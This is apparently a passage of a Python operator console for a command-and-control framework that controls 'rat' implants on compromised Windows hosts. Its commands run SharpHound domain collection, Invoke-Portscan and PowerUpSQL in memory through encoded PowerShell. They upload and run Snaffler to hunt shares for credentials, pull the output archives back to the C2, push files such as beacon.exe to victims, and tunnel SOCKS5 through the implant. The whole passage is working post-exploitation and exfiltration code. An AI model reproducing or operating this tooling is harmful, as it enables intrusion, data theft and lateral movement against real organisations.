        method     = arg.strip() or "All"
        remote_dir = r"C:\Windows\Temp"
        zip_name   = "bhdata.zip"
        remote_zip = remote_dir + "\\" + zip_name
        local_zip  = zip_name

        invoke  = (f'Invoke-BloodHound -CollectionMethod {method} '
                   f'-OutputDirectory "{remote_dir}" -ZipFileName "{zip_name}"')
        command = self._encode_ps(ps1, invoke)

        s, url = self._session()
        if not s: return
        info(f"Running SharpHound (CollectionMethod={method}) …")
        output = self._dispatch_ps(s, url, "ps_sharphound", command, timeout=300)
        if output is None:
            warn("Timed out waiting for SharpHound — check: tasks")
            return
        print_output(output)

        dl_module = self._find_module_by_type(s, url, "download", title="Download")
        if not dl_module:
            warn(f"Download module not found — retrieve manually: download \"{remote_zip}\" {local_zip}")
            return
        info(f"Downloading {remote_zip} → {local_zip} …")
        _, dl_out = self._dispatch_task(s, url, dl_module,
                                         {"remote_path": remote_zip, "local_path": local_zip},
                                         timeout=120)
        if dl_out is not None:
            ok(f"Saved: {local_zip}")
        else:
            warn(f"Download timed out — run:  download \"{remote_zip}\" {local_zip}")

    # ── snaffler ──────────────────────────────────────────────────────────────

    def do_snaffler(self, arg):
        """snaffler [<remote_drop_path>]  —  Upload Snaffler.exe, run it, download output"""
        if not self._need_rat(): return
        exe_path = Path(__file__).parent.parent / "code_snippets" / "tools" / "original" / "exe" / "Snaffler.exe"
        if not exe_path.exists():
            err(f"Snaffler.exe not found: {exe_path}")
            return

        remote_exe    = arg.strip() or r"C:\Windows\Temp\Snaffler.exe"
        remote_out    = remote_exe.replace(".exe", "_out.txt")
        local_out     = "snaffler_out.txt"

        s, url = self._session()
        if not s: return

        # 1. Upload
        ul_module = self._find_module_by_type(s, url, "upload", title="Upload")
        if not ul_module: return
        info(f"Uploading Snaffler.exe → {remote_exe} …")
        _, ul_out = self._dispatch_task(s, url, ul_module,
                                         {"local_path": str(exe_path), "remote_path": remote_exe},
                                         timeout=120)
        if ul_out is None:
            warn("Upload timed out")
            return
        ok("Uploaded")

        # 2. Run
        shell_module = self._find_shell_module(s, url)
        if not shell_module: return
        run_cmd  = f'"{remote_exe}" -s -o "{remote_out}"'
        info(f"Running Snaffler … (output → {remote_out})")
        run_out = self._dispatch_and_wait(s, url, shell_module, run_cmd, timeout=300)
        if run_out is not None:
            print_output(run_out)

        # 3. Download
        dl_module = self._find_module_by_type(s, url, "download", title="Download")
        if not dl_module:
            warn(f"Download module not found — run:  download \"{remote_out}\" {local_out}")
            return
        info(f"Downloading {remote_out} → {local_out} …")
        _, dl_out = self._dispatch_task(s, url, dl_module,
                                         {"remote_path": remote_out, "local_path": local_out},
                                         timeout=120)
        if dl_out is not None:
            ok(f"Saved: {local_out}")
        else:
            warn(f"Download timed out — run:  download \"{remote_out}\" {local_out}")

    def complete_snaffler(self, text, line, begidx, endidx):
        return self._path_complete(text, line, begidx)

    # ── portscan ──────────────────────────────────────────────────────────────

    def do_portscan(self, arg):
        """portscan <hosts> <ports>  —  Run Invoke-Portscan in-memory on active rat (requires mode ps)"""
        if not self._need_ps_rat(): return
        ps1 = self._ps_tools_dir() / "Invoke-Portscan.ps1"
        if not ps1.exists():
            err(f"PS1 not found: {ps1}")
            return

        try:
            parts = shlex.split(arg)
        except ValueError as e:
            err(f"Parse error: {e}")
            return

        if len(parts) < 2:
            err("Usage: portscan <hosts> <ports>")
            info('  portscan "192.168.1.0/24" "22,80,443,445,3389"')
            info('  portscan "10.0.0.1-10" "1-1024"')
            return

        hosts, ports = parts[0], parts[1]
        invoke  = f'Invoke-Portscan -Hosts "{hosts}" -Ports "{ports}" | Select-Object -ExpandProperty openPorts'
        command = self._encode_ps(ps1, invoke)

        s, url = self._session()
        if not s: return
        info(f"Port scanning {hosts} : {ports} …")
        output = self._dispatch_ps(s, url, "ps_portscan", command, timeout=300)
        if output is not None:
            ok("Portscan complete")
            print_output(output)
        else:
            warn("Timed out — task still running, check: tasks")

    # ── powerupsql ────────────────────────────────────────────────────────────

    def do_powerupsql(self, arg):
        """powerupsql  —  Run PowerUpSQL domain SQL instance discovery in-memory (requires mode ps)"""
        if not self._need_ps_rat(): return
        ps1 = self._ps_tools_dir() / "PowerUpSQL.ps1"
        if not ps1.exists():
            err(f"PS1 not found: {ps1}")
            return

        invoke  = "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose"
        command = self._encode_ps(ps1, invoke)

        s, url = self._session()
        if not s: return
        info("Running PowerUpSQL discovery …")
        output = self._dispatch_ps(s, url, "ps_powerupsql", command, timeout=180)
        if output is not None:
            ok("PowerUpSQL complete")
            print_output(output)
        else:
            warn("Timed out — task still running, check: tasks")

    # ── upload ────────────────────────────────────────────────────────────────

    def do_upload(self, arg):
        """upload <local_path> <remote_path>  —  Push a file from C2 to active rat"""
        if not self._need_rat(): return
        try:
            parts = shlex.split(arg)
        except ValueError as e:
            err(f"Parse error: {e}")
            return
        if len(parts) != 2:
            err('Usage: upload <local_path> <remote_path>')
            err('       upload /tmp/beacon.exe "C:\\Users\\Public\\beacon.exe"')
            return
        local_path, remote_path = parts
        if not Path(local_path).exists():
            err(f"Local file not found: {local_path}")
            return
        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "upload", title="Upload")
        if not module_id: return
        size = Path(local_path).stat().st_size
        info(f"Uploading  {cyan(local_path)}  ({size:,} bytes)  →  {cyan(remote_path)}  …")
        task_id, output = self._dispatch_task(
            s, url, module_id,
            {"local_path": local_path, "remote_path": remote_path},
            timeout=120)
        if task_id is None: return
        if output is not None:
            ok(output)
        else:
            warn(f"No response — run:  output {task_id}")

    # ── SOCKS5 proxy ─────────────────────────────────────────────────────────

    def do_socks5(self, arg):
        """socks5 start [port] | stop | status  —  SOCKS5 tunnel through implant"""
        parts = arg.split()
        sub = parts[0] if parts else 'help'

        if sub == 'start':
            if not self._need_rat(): return
            port = parts[1] if len(parts) > 1 else '1080'
            s, url = self._session()
            if not s: return
            module_id = self._find_module_by_type(s, url, "socks5_proxy")
            if not module_id:
                err("socks5_proxy module not loaded — restart the server")
                return
            task_id, _ = self._dispatch_task(
                s, url, module_id, {"port": port}, wait=False)
            if task_id is None: return
            self._socks5_task_id = task_id
            self._socks5_port = int(port)
            ok(f"SOCKS5 proxy starting on 127.0.0.1:{port}")
            info(f"Configure proxychains:  socks5 127.0.0.1 {port}")
            info(f"Task: {task_id}")
            warn("Implant is single-threaded — stop proxy before issuing other commands")

        elif sub == 'stop':
            task_id = getattr(self, '_socks5_task_id', None)
            if not task_id:
                err("No active SOCKS5 proxy tracked in this session")
                return
            s, url = self._session()
            if not s: return
            resp = s.post(f"{url}/api/tasks/{task_id}/stop")
            if resp.ok:
                msg = resp.text.strip()
                if msg == 'cancelled':
                    ok("SOCKS5 task cancelled (implant hadn't picked it up yet)")
                else:
                    ok("SOCKS5 proxy stopped")
                self._socks5_task_id = None
                self._socks5_port = None
            else:
                warn(f"Stop returned {resp.status_code}: {resp.text}")
                info("The implant may not have picked up the task yet — try again in a few seconds")

        elif sub == 'status':
            task_id = getattr(self, '_socks5_task_id', None)
            if task_id:
                ok(f"SOCKS5 proxy active  (task: {task_id})")
            else:
                info("No active SOCKS5 proxy in this session")

        else:
            info("Usage:  socks5 start [port]  |  socks5 stop  |  socks5 status")

    def complete_socks5(self, text, line, begidx, endidx):
        subs = ['start', 'stop', 'status']
        return [s for s in subs if s.startswith(text)]
